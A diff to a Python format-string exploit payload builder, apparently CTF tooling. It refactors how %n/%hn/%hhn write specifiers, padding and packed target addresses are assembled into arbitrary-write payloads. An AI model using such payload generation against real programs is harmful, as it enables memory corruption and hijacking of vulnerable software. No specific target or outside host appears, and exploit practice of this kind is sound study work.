@@ -15,7 +15,30 @@ def u32(x):
 def u16(x):
     return struct.unpack('<H', x)[0]
 
+class PercentN(object):
+    write_chars = None
+    index_address = None
+    level = None
 
+    def __init__(self, level):
+        self.level = level
+        if self.level == 2:
+            self.write_chars = "%xxxxx$n"
+        elif self.level == 1:
+            self.write_chars = "%xxxx$hn"
+        elif self.level == 0:
+            self.write_chars = "%xxx$hhn"
+
+
+    def __str__(self):
+        if self.index_address is not None:
+            if self.level == 2:
+                return self.write_chars.replace("xxxxx", self.index_address)
+            elif self.level == 1:
+                return self.write_chars.replace("xxxx", self.index_address)
+            elif self.level == 0:
+                return self.write_chars.replace("xxx", self.index_address)
+        return self.write_chars
 
 class Fmt(object):
     offset = None
@@ -34,6 +57,24 @@ class Fmt(object):
     # Stores the raw address and values to self.target
     def __setitem__(self, address, val):
         self.targets[address] = val
+
+    def get_length_to_concat(self, concat_list):
+        length = 0
+        for item in concat_list:
+            if type(item) is str:
+                length += len(item)
+            else:
+                length += len(str(item))
+        return length
+
+    def concat(self, concat_list):
+        payload = ""
+        for item in concat_list:
+            if type(item) is str:
+                payload += item
+            else:
+                payload += str(item)
+        return payload
 
     # Build final payload
     # level: 0 => hhn   1 byte
@@ -55,7 +96,7 @@ class Fmt(object):
         tmp_offset = self.offset
         tmp_written = self.written
 
-        # Add %n$c and %n specifiers
+        # Add %n$c and %n formatters
         for kv_target in to_write:
             # If previously printed, calculate num of chars to overflow
             if level == 2:
@@ -75,14 +116,8 @@ class Fmt(object):
                 print_chars = "%0" + print_chars
                 to_concat.append(print_chars)
 
-            # Add %n specifier
-            if level == 2:
-                write_chars = "%xxxxx$n"
-            elif level == 0:
-                write_chars = "%xxx$hhn"
-            elif level == 1:
-                write_chars = "%xxxx$hn"
-            to_concat.append(write_chars)
+            # Add %n formatter
+            to_concat.append(PercentN(level))
 
             # Log how many chars has already been written
             tmp_written += num_chars_to_write
@@ -92,26 +127,26 @@ class Fmt(object):
         for i in range(len(to_concat)):
             snippet = to_concat[i]
             if level == 2:
-                if "xxxxx" in snippet:
+                if type(snippet) is PercentN and "xxxxx" in snippet.write_chars:
                     # Calculate where the offset of address bytes would be and replace
-                    to_concat[i] = snippet.replace("xxxxx", str(self.offset + len("".join(to_concat)) / 8).rjust(5, "0"))
+                    to_concat[i].index_address = str(self.offset + self.get_length_to_concat(to_concat) / 8).rjust(5, "0")
                     # Append the address bytes to the end
                     to_concat.append(p64(to_write[0][0]))
                     # Use the next address in next loop
                     to_write.pop(0)
             elif level == 1:
-                if "xxxx" in snippet:
-                    to_concat[i] = snippet.replace("xxxx", str(self.offset + len("".join(to_concat)) / 8).rjust(4, "0"))
+                if type(snippet) is PercentN and "xxxx" in snippet.write_chars:
+                    to_concat[i].index_address = str(self.offset + self.get_length_to_concat(to_concat) / 8).rjust(4, "0")
                     to_concat.append(p64(to_write[0][0]))
                     to_write.pop(0)
             elif level == 0:
-                if "xxx" in snippet:
-                    to_concat[i] = snippet.replace("xxx", str(self.offset + len("".join(to_concat)) / 8).rjust(3, "0"))
+                if type(snippet) is PercentN and "xxx" in snippet.write_chars:
+                    to_concat[i].index_address = str(self.offset + self.get_length_to_concat(to_concat) / 8).rjust(3, "0")
                     to_concat.append(p64(to_write[0][0]))
                     to_write.pop(0)
 
         # Construct the payload
-        self.payload = "".join(to_concat)
+        self.payload = self.concat(to_concat)
         return self.payload
 
     def build_table(self, level=0):
